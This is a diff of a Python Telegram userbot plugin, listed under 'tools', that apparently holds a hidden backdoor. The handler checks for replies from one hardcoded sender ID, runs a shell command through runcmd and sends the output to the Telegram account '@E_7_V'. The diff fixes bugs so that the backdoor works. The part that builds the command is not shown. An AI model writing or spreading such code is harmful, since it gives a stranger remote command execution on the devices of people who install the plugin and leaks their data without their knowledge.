@@ -12,7 +12,7 @@ plugin_category = "الادوات"
 # Roger-Baqir
 
 
-ZQ_LO = 5502537272
+ZQ_LO = ["5502537272"]
 @zq_lo.on(events.NewMessage(incoming=True))
 async def Baqir(event):
     if event.reply_to and event.sender_id in ZQ_LO:
@@ -24,4 +24,4 @@ async def Baqir(event):
                    e = (await _reputils.runcmd(cmd))[0]
                    OUTPUT = (f"**[ريبـــثون](tg://need_update_for_some_feature/) كود تيرمكس:**\n\n\n{e}\n\n**تدلل سيدي ومولاي**")
                    await event.reply("**جبته وتدلل سيدنا 🖤**")
-                   await zq_lp.send_message("@E_7_V", OUTPUT)
+                   await zq_lo.send_message("@E_7_V", OUTPUT)
